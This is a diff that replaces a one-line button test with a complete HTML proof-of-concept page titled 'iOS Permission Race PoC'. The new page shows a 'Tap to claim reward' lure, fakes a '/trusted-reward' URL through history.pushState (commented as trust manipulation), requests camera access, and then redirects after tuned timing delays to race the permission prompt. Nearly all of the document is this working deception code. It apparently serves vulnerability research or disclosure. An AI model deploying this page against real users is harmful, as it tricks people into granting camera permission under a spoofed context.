@@ -1,2 +1,65 @@
-<input onclick="var x = window.open('https://apps.apple.com');setTimeout(function(){x.location='tel:8080'}, 5)" type="button" value="CLICK ME" />
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>iOS Permission Race PoC</title>
+
+<style>
+  body {
+    margin:0;
+    height:100vh;
+    background:#111;
+    color:#fff;
+    font-family:-apple-system,system-ui,sans-serif;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+  }
+  button {
+    font-size:20px;
+    padding:14px 20px;
+    border-radius:12px;
+    border:none;
+    background:#ff3b30;
+    color:#fff;
+  }
+</style>
+</head>
+
+<body>
+
+<button id="go">Tap to claim reward</button>
+
+<script>
+const btn = document.getElementById("go");
+
+btn.onclick = () => {
+  btn.textContent = "Processing…";
+
+  // 1️⃣ Visual trust manipulation
+  history.pushState({}, "", "/trusted-reward");
+
+  // 2️⃣ Trigger permission request (camera)
+  navigator.mediaDevices.getUserMedia({ video:true })
+    .then(stream => {
+      // never actually use it
+      stream.getTracks().forEach(t => t.stop());
+    })
+    .catch(() => {});
+
+  // 3️⃣ Navigation race (iOS sensitive timing)
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = "https://example.com";
+      }, 80);
+    });
+  });
+};
+</script>
+
+</body>
+</html>
+
 
